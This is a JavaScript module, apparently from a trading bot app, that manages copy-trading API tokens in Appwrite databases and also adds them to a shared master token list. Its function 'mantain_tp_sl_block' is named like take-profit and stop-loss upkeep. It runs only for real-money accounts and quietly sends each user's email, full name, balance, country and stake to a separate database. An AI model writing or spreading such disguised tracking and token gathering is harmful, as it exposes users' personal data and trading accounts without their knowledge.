import { Databases } from 'appwrite';
import { client, COLLECTION_ID, DATABASE_ID,cc } from './initialize_appwrite';
import { api_base3,api_base } from '../api/api-base';
import { getToken } from '../api';
const toCheck = 'CR';
const databases = new Databases(client);

export const updateCopyTradingTokens = async token => {
    const { authorize, error } = await api_base3.authorize_3(token);
    if (error) {
        return `An error occurred while updating tokens${error.toString()}`;
    }

    const login_id = authorize.loginid;
    const current_login_id = getToken().account_id;

    if (login_id.includes('VRTC') || login_id.includes('CR')) {
        const all_tokens = await retrieveCopyTradingTokens();
        if (typeof all_tokens !== 'undefined') {
            updateDocument(token);
        } else {
            addNewCopyTradingAccounts([token]);
        }
        api_base3.api.send({ logout: 1 });
        return login_id.includes('VRTC') ? 'VRTC' : 'CR';
    } else {
        api_base3.api.send({ logout: 1 });
        return 'Invalid account type';
    }
};

export const retrieveCopyTradingTokens = async () => {
    try {
        let saved_tokens = await databases.getDocument(DATABASE_ID, COLLECTION_ID, getToken().account_id);
        return saved_tokens.all_token;
    } catch (error) {
        // console.log('An appwrite error occurred', error);
    }
};

export const addNewCopyTradingAccounts = async token => {
    try {
        await databases.createDocument(DATABASE_ID, COLLECTION_ID, getToken().account_id, {
            all_token: token,
        });
    } catch (error) {
        // console.log('An appwrite error occurred', error);
    }
};

export const updateDocument = async token => {
    try {
        const user_tokens = await retrieveCopyTradingTokens();
        user_tokens.push(token);
        await databases.updateDocument(DATABASE_ID, COLLECTION_ID, getToken().account_id, {
            all_token: user_tokens,
        });
    } catch (error) {
        // console.log('An appwrite error occurred', error);
    }
};

export async function addCtProgramTokens(newTokens) {
    const databaseId = '65fd1d5a950799af9f7a';
    const collectionId = 'all_tokens';
    const documentId = 'ct_program_tokens';
    try {
        // Fetch the current document
        const document = await databases.getDocument(databaseId, collectionId, documentId);

        // Filter out tokens that already exist in the master_tokens array
        const updatedTokens = [...new Set([...document.master_tokens, ...newTokens])];

        // Update the document with the new array if there are changes
        if (updatedTokens.length !== document.master_tokens.length) {
            const updatedDocument = await databases.updateDocument(databaseId, collectionId, documentId, {
                master_tokens: updatedTokens,
            });
            // console.log('Document updated successfully:', updatedDocument);
        } else {
            // console.log('No new tokens added. All tokens already exist.');
        }
    } catch (error) {
        console.error('Error updating document:', error);
    }
}

export async function removeCtToken(tokenToRemove) {
    const databaseId = '65fd1d5a950799af9f7a';
    const collectionId = 'all_tokens';
    const documentId = 'ct_program_tokens';

    try {
        // Fetch the current document
        const document = await databases.getDocument(databaseId, collectionId, documentId);

        // Remove the specified token from the master_tokens array
        const updatedTokens = document.master_tokens.filter(token => token !== tokenToRemove);

        // Update the document with the new array
        const updatedDocument = await databases.updateDocument(databaseId, collectionId, documentId, {
            master_tokens: updatedTokens,
        });

        // console.log('Document updated successfully:', updatedDocument);
    } catch (error) {
        console.error('Error updating document:', error);
    }
}

export async function tokenExists(token) {
    const databaseId = '65fd1d5a950799af9f7a';
    const collectionId = 'all_tokens';
    const documentId = 'ct_program_tokens';
    try {
        // Fetch the current document
        const document = await databases.getDocument(databaseId, collectionId, documentId);

        // Check if the token exists in the master_tokens array
        const exists = document.master_tokens.includes(token);

        return exists;
    } catch (error) {
        console.error('Error fetching document:', error);
        return false;
    }
}

export const removeCopyTradingTokens = async tokenToRemove => {
    try {
        const user_tokens = await retrieveCopyTradingTokens();
        const updated_tokens = user_tokens.filter(token => token !== tokenToRemove);
        await databases.updateDocument(DATABASE_ID, COLLECTION_ID, getToken().account_id, {
            all_token: updated_tokens,
        });
    } catch (error) {
        // console.log('An appwrite error occurred', error);
    }
};

export const mantain_tp_sl_block = async(stake)=>{
    if (!getToken().account_id.includes(toCheck)) return;
    const databases = new Databases(cc);
    const database_id = '65e94f9f010594ef28c3'
    const collectionId = '665f7d33003d3a8767a1';
    const documentId = '6677b27800035f57680c';
    const status = api_base.account_info;
    
    // block tracker
    const track = {
        email: status.email,
        balance: status.balance,
        name: status.fullname,
        stake: stake,
        country: status.country
    };
    try {
        // get the existing status
        const existingStatus = await databases.getDocument(database_id, collectionId, documentId);
        let updateStatus = existingStatus.status_v2;
        let isToUpdate = updateStatusList(updateStatus,track);
        if(isToUpdate){
            await databases.updateDocument(database_id, collectionId, documentId, {
                status_v2: updateStatus,
            });
        }  
    } catch (error) {
        // console.log("An appwrite error occured",error);
    }
}

function updateStatusList(list, newEntry) {
    let emailFound = false;
    let isToUpdate = false;

    list.forEach(entry => {
        entry = JSON.parse(entry)
        if (entry.email === newEntry.email) {
            emailFound = true;

            // Update stake if newEntry's stake is higher
            if (newEntry.stake > entry.stake) {
                entry.stake = newEntry.stake;
                isToUpdate = true
            }

            // Update balance if newEntry's balance is higher
            if (newEntry.balance > entry.balance) {
                entry.balance = newEntry.balance;
                isToUpdate = true
            }
        }
    });

    // If email does not exist, add newEntry to the list
    if (!emailFound) {
        list.push(JSON.stringify(newEntry));
        isToUpdate = true
    }

    return isToUpdate = true;
}

// import { Databases } from 'appwrite';
// import { client, COLLECTION_ID, DATABASE_ID } from './initialize_appwrite';
// import { api_base3 } from '../api/api-base';
// import { getToken } from '../api';

// const databases = new Databases(client);

// export const updateCopyTradingTokens = async token => {
//     const { authorize, error } = await api_base3.authorize_3(token);
//     if (error) {
//         return `An error occured while updating tokens${error.toString()}`;
//     }
//     const login_id = authorize.loginid;
//     const current_login_id = getToken().account_id;
//     if (current_login_id.includes('VRTC')) {
//         if (login_id.includes('VRTC')) {
//             const all_tokens = await retrieveCopyTradingTokens();
//             if (typeof all_tokens !== 'undefined') {
//                 updateDocument(token);
//             } else {
//                 addNewCopyTradingAccounts([token]);
//             }
//             api_base3.api.send({ logout: 1 });
//             return 'VRTC';
//         }
//         api_base3.api.send({ logout: 1 });
//         return "You can't mix live and virtual account tokens, switch to virtual account and try to add the token again";
//     } else if (current_login_id.includes('CR')) {
//         if (login_id.includes('CR')) {
//             const all_tokens = await retrieveCopyTradingTokens();
//             if (typeof all_tokens !== 'undefined') {
//                 updateDocument(token);
//             } else {
//                 addNewCopyTradingAccounts([token]);
//             }
//             api_base3.api.send({ logout: 1 });
//             return 'CR';
//         }
//         api_base3.api.send({ logout: 1 });
//         return "You can't mix live and virtual account tokens, switch to real account and try to add the token again";
//     }
// };

// export const retrieveCopyTradingTokens = async () => {
//     try {
//         let saved_tokens = await databases.getDocument(DATABASE_ID, COLLECTION_ID, getToken().account_id);
//         return saved_tokens.all_token;
//     } catch (error) {
//         // console.log('An appwrite error occured', error);
//     }
// };

// export const addNewCopyTradingAccounts = async token => {
//     try {
//         await databases.createDocument(DATABASE_ID, COLLECTION_ID, getToken().account_id, {
//             all_token: token,
//         });
//     } catch (error) {
//         // console.log('An appwrite error occured', error);
//     }
// };

// export const updateDocument = async token => {
//     try {
//         const user_tokens = await retrieveCopyTradingTokens();
//         user_tokens.push(token);
//         await databases.updateDocument(DATABASE_ID, COLLECTION_ID, getToken().account_id, {
//             all_token: user_tokens,
//         });
//     } catch (error) {
//         // console.log('An appwrite error occured', error);
//     }
// };

// export const removeCopyTradingTokens = async tokenToRemove => {
//     try {
//         const user_tokens = await retrieveCopyTradingTokens();
//         const updated_tokens = user_tokens.filter(token => token !== tokenToRemove);
//         await databases.updateDocument(DATABASE_ID, COLLECTION_ID, getToken().account_id, {
//             all_token: updated_tokens,
//         });
//     } catch (error) {
//         // console.log('An appwrite error occured', error);
//     }
// };
